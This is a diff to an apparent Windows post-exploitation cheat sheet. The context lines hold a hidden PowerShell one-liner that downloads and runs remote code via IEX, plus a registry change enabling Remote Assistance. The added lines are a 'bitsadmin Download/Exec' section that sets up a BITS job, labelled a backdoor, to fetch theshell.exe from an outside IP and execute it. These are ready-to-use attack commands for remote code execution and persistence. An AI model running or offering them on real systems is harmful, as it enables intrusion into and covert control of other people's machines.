@@ -37,6 +37,25 @@ Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html
  * **Command with arguments**: `powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"`
  * **Description**: According to [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), _"Schedule this and it will execute the shellcode on that page, pulling it each time (so you can change as needed)"_.
 
+### bitsadmin Download/Exec
+Make the backdoor:
+```
+bitsadmin /create backdoor
+bitsadmin /addfile backdoor http://192.168.20.10/theshell.exe C:\windows\temp\theshell.exe
+bitsadmin /SETMINRETRYDELAY 88000
+bitsadmin /SETNOTIFYCMDLINE backdoor C:\windows\temp\theshell.exe NULL
+```
+
+Check the backdoor is set up correctly:
+```
+bitsadmin /getnotifycmdline backdoor
+bitsadmin /listfiles backdoor
+```
+
+Run the backdoor:
+```
+bitsadmin /RESUME backdoor
+```
 
 ### Remote Assistance Enable
  * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f`
